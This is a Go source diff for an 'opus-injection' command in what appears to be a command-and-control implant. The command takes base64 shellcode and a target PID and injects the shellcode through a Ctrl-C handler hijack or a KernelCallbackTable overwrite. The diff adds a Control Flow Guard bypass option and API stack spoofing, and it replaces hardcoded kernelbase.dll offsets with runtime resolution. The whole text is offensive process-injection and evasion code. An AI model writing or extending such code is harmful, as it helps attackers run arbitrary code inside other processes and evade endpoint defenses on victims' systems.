@@ -18,7 +18,6 @@ package commands
 
 import (
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"runtime"
 	"unsafe"
@@ -38,14 +37,9 @@ const (
 	CTRL_SHUTDOWN_EVENT = 6
 )
 
-// Handler list offsets in kernelbase.dll (Windows 10/11)
-// These were determined through reversing with WinDbg
-const (
-	// RVA offsets from kernelbase.dll base
-	HandlerListRVA                = 0x399490 // Pointer to heap-allocated array of encoded handler pointers
-	HandlerListLengthRVA          = 0x39CBB0 // DWORD: current number of handlers
-	AllocatedHandlerListLengthRVA = 0x39CBB4 // DWORD: allocated array capacity
-)
+// Handler list offsets in kernelbase.dll are resolved dynamically at runtime
+// via scanSetConsoleCtrlHandler() in opusinjection_resolve.go.
+// These offsets vary across Windows builds and cannot be hardcoded.
 
 // ProcessCookie info class for NtQueryInformationProcess
 const ProcessCookie = 36
@@ -84,6 +78,7 @@ var (
 	procFreeConsole                 = kernel32.NewProc("FreeConsole")
 	procAllocConsole                = kernel32.NewProc("AllocConsole")
 	procGenerateConsoleCtrlEvent    = kernel32.NewProc("GenerateConsoleCtrlEvent")
+	procSetConsoleCtrlHandler       = kernel32.NewProc("SetConsoleCtrlHandler")
 	procNtQueryInformationProcessOp = ntdllOpus.NewProc("NtQueryInformationProcess")
 	procFindWindowA                 = user32Opus.NewProc("FindWindowA")
 	procFindWindowExA               = user32Opus.NewProc("FindWindowExA")
@@ -110,6 +105,8 @@ type OpusInjectionParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"`
 	PID          int    `json:"pid"`
 	Variant      int    `json:"variant"`
+	CFGBypass    bool   `json:"cfg_bypass"` // Mark shellcode as valid CFG target before callback execution
+	StackSpoof   bool   `json:"stack_spoof"`
 }
 
 // Execute executes the opus-injection command
@@ -118,10 +115,9 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 		return errorResult("Error: This command is only supported on Windows")
 	}
 
-	var params OpusInjectionParams
-	err := json.Unmarshal([]byte(task.Params), &params)
-	if err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := unmarshalParams[OpusInjectionParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if params.ShellcodeB64 == "" {
@@ -141,12 +137,17 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 		return errorResult("Error: Shellcode data is empty")
 	}
 
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
+	}
+
 	var output string
 	switch params.Variant {
 	case 1:
-		output, err = executeOpusVariant1(shellcode, uint32(params.PID))
+		output, err = executeOpusVariant1(shellcode, uint32(params.PID), params.CFGBypass)
 	case 4:
-		output, err = executeOpusVariant4(shellcode, uint32(params.PID))
+		output, err = executeOpusVariant4(shellcode, uint32(params.PID), params.CFGBypass)
 	default:
 		return errorf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant)
 	}
